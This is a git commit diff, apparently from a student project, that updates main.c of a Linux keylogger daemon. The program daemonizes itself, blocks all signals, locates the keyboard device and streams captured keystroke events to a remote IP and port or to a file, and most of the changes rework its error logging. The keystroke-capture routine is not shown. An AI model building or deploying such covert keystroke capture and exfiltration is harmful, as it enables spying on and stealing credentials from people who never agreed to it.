3d3473ac9cd148c7742b39f79fbfd23db9e2ba68
Fabio Cinicolo <f.cinicolo@studenti.unina.it>
2022-07-05 11:36:45 +0200

    Update main.c

--- main.c
+++ main.c
@@ -26,19 +26,19 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Usage: ./keylogger-daemon ip port [0|1] OR ./keylogger-daemon filename [0|1]\n"), exit(EXIT_FAILURE);
 
     if (!daemonize("keylogger-daemon")) /* Convert process to daemon */
-        syslog(LOG_ERR, "Couldn't start daemon"), exit(EXIT_FAILURE);
+        syslog(LOG_ERR, "Couldn't daemonize process"), exit(EXIT_FAILURE);
 
     is_single_instance = argc == 4 ? atoi(argv[3]) : atoi(argv[2]);
 
     if (is_single_instance)
-        if ((daemonAlreadyRunning(&flock))) /* If a copy of this daemon is already running we terminate. We return the write lock file descriptor */
-            exit(EXIT_FAILURE);
+        if ((daemonAlreadyRunning(&flock))) /* If a copy of this daemon is already running or lockfile() failed for another reason, daemon terminates */
+           syslog(LOG_ERR, "An instance of the keylogger is already running or lockfile() failed, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
 
-    if (blockAllSignals() < 0) /* Blocking all signals */
-        syslog(LOG_ERR, "Couldn't set signal bitmask%s", strerror(errno)), exit(EXIT_FAILURE);
+    if (!blockAllSignals()) /* Blocking all signals */
+        syslog(LOG_ERR, "Couldn't set signal bitmask, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
 
     if ((keyboard = findKeyboardDevice(PATH)) < 0) /* Looking for Keyboard device driver */
-        syslog(LOG_ERR, "Couldn't find keyboard device"), exit(EXIT_FAILURE);
+        syslog(LOG_ERR, "Couldn't find keyboard device, quitting.."), exit(EXIT_FAILURE);
 
     file_out_type = argc == 4 ? SOCKET : FILE;
 
@@ -47,20 +47,22 @@ int main(int argc, char *argv[])
         char *ip = argv[1];
         short port = atoi(argv[2]);
         if ((fd = openConnectionWithServer(ip, port)) < 0) /* Connecting with server */
-            syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later: %s", strerror(errno)), exit(EXIT_FAILURE);
-        unblockSignal(SIGPIPE); /* If server closes connection and keylogger tries to send events, SIGPIPE is generated */
+            syslog(LOG_ERR, "Couldn't connect with server, check hostname or try again later, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
+        if(!unblockSignal(SIGPIPE))/* If server closes connection and keylogger tries to send events, SIGPIPE is generated */
+            syslog(LOG_ERR, "Couldn't unblock SIGPIPE, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
     }
     else if (file_out_type == FILE) /* If user decided to save events locally */
     {
         char *file_out_path = argv[1];
         if ((fd = open(file_out_path, O_WRONLY | O_CREAT | O_APPEND | O_TRUNC, S_IRUSR | S_IRGRP | S_IROTH)) < 0)
-            syslog(LOG_ERR, "Couldn't open file %s: %s", argv[2], strerror(errno)), exit(EXIT_FAILURE);
-        unblockSignal(SIGTERM); /* We can terminate safely daemon only by sending SIGTERM */
+            syslog(LOG_ERR, "Couldn't open file %s, quitting.. [%s]", argv[2], strerror(errno)), exit(EXIT_FAILURE);
+        if(!unblockSignal(SIGTERM)) /* We can safely terminate daemon only by sending SIGTERM */
+            syslog(LOG_ERR, "Couldn't unblock SIGTERM, quitting.. [%s]", strerror(errno)), exit(EXIT_FAILURE);
     }
 
     startKeylogger(keyboard, fd); /* Reading from keyboard device and sending events to file */
 
-    syslog(LOG_INFO, "**Demon exited**");
+    syslog(LOG_INFO, "**Daemon safely terminated**");
     close(flock); /* Closing daemon's lock file */
     exit(EXIT_SUCCESS);
 }
@@ -69,9 +71,7 @@ int blockAllSignals()
 {
     sigset_t signal_set;
     sigfillset(&signal_set);
-    if (sigprocmask(SIG_SETMASK, &signal_set, NULL) < 0)
-        return -1;
-    return 0;
+    return sigprocmask(SIG_SETMASK, &signal_set, NULL) < 0 ? 0 : 1;
 }
 
 int unblockSignal(int signum)
@@ -80,7 +80,5 @@ int unblockSignal(int signum)
     sigset_t signal_set;
     sigemptyset(&signal_set);
     sigaddset(&signal_set, signum);
-    if (sigprocmask(SIG_UNBLOCK, &signal_set, NULL) < 0)
-        return -1;
-    return 0;
+    return sigprocmask(SIG_UNBLOCK, &signal_set, NULL) < 0 ? 0 : 1;
 }
